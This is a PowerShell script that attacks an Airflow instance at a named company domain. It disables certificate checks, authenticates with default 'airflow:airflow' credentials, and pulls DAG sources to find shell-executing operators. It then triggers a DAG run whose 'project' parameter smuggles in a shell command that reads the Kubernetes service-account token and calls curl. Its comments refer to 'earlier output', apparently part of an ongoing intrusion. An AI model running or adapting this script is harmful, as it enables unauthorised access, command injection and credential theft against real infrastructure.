Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
    }
}

# Read DAG source files to find BashOperator or KubernetesPodOperator
# file tokens from earlier output
$file_tokens = @(
    ".eJxT0s8vKNFPzCxKy8kv109JTC_Wz87NT4rPzc8rycipBInEIwvoFVQqAQAEsxPe.frdPIH4Ld-Zc27kzKYh_xzlbWyg",
    ".eJxT0s8vKNFPzCxKy8kv109JTC_Wz05My06MT87Py0tNLskvii8uSSwpLQbJxWOX0iuoVAIA7OocDg.q1rRVRsxTq0GPxMJgMDzO72CJ7g",
    ".eJxT0s8vKNFPzCxKy8kv109JTC_WTyouji8tSEksSY3PyczNLIlPrSjILEpNAcnG45LUK6hUAgBmOB2o.q_XjFBbJnLtYlbj-x9u8N90w0sY",
    ".eJxT0s8vKNFPzCxKy8kv109JTC_WT9LPKy0tTi0pKkrNzM8ryS8qKk4tSy2OBkknIYvrFVQqAQBIuBo-.wvnQyBb_f5AW1k0gNdxoxG7LK8c",
    ".eJxT0s8vKNFPzCxKy8kv109JTC_WT60oyC8qic8tLi7MiS_Jj0_Pz0_PSY0vzkhNLSEgq1dQqQQAOCogoQ.HlDlblg-hqzNkf592YZpo2a7HHA"
)

foreach ($ft in $file_tokens) {
    Write-Host "`n=== SOURCE $ft ==="
    $src = AF-Get "/api/v1/dagSources/$ft"
    # Look for KubernetesPodOperator, BashOperator, subprocess
    if ($src -match "BashOperator|KubernetesPod|subprocess|os.system") {
        Write-Host "** INTERESTING: $src"
    } else {
        Write-Host "(no bash/k8s found)"
    }
}

# Try to get all dag source files from the dag list
# Look for KubernetesPodOperator specifically in all DAGs
$all_dag_ids = @("EOD","EOM","DMS","InsertInstallments","DeleteInstallments","DeletePayments","DistributePayments","jis_check_journal_confins","jis_generate_confins")
foreach ($dag in $all_dag_ids) {
    Write-Host "`n=== TASKS $dag ==="
    $t = AF-Get "/api/v1/dags/$dag/tasks"
    if ($t -match "BashOperator|KubernetesPod") {
        Write-Host "** HAS BASH/K8S: $t"
    } else {
        # just print class names
        $t | Select-String "class_name" | ForEach-Object { Write-Host "  " $_.Line }
    }
}

# IMPORTANT: Try to trigger a DAG with conf injection
# Airflow allows passing conf to DAG runs - some DAGs use conf params in BashOperator
# Try triggering dbdocs_build_dbml_dynamic with command injection in project param
Write-Host "`n=== TRIGGER dbdocs with injection ==="
$ts = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
$run_body = "{`"conf`":{`"project`":`"test; cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s_tok; curl -sk https://dev-airflow.kbfinansia.com/`",`"password`":`"`"},`"logical_date`":`"$ts`"}"
Write-Host "Body: $run_body"
$r = AF-Post "/api/v1/dags/dbdocs_build_dbml_dynamic/dagRuns" $run_body
Write-Host $r

# Also check if we can get the Airflow pod's K8s token via the /proc or env endpoint  
# Try the Airflow extra endpoint
Write-Host "`n=== AIRFLOW EXTRA ENDPOINTS ==="
$extra = AF-Get "/api/v1/datasets"
Write-Host ($extra | Select-String "kubernetes|k8s|token" | ForEach-Object { $_.Line })
